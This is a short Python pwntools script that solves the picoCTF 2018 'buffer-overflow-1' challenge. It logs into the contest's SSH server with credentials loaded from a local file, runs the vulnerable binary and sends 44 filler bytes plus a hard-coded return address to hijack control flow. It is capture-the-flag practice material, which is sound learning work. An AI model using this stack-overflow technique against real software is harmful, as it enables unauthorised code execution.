from pwn import *
import json


REMOTE=True
hostname ="2018shell.picoctf.com"
if REMOTE:
    with open("/.2018creds.json") as f:
        creds = json.load(f)
        print(creds["user"],creds["pass"])
    s = ssh(host=hostname,user=creds["user"],password=creds["pass"])
    sh = s.process('sh')
    sh.sendlineafter('$ ','cd /problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba')
    sh.sendlineafter('$ ','ls')
    lscommand = sh.recv()
    print(lscommand)
    print(lscommand.decode().split())
    sh.sendlineafter('$ ','./vuln')
    print(sh.recv().decode())
    payload ="\x41" * 44 + "\xcb\x85\x04\x08"
    sh.sendline(payload)
    print(sh.recvlineS())
    print(sh.recvlineS())
    #print(sh.recv().decode())
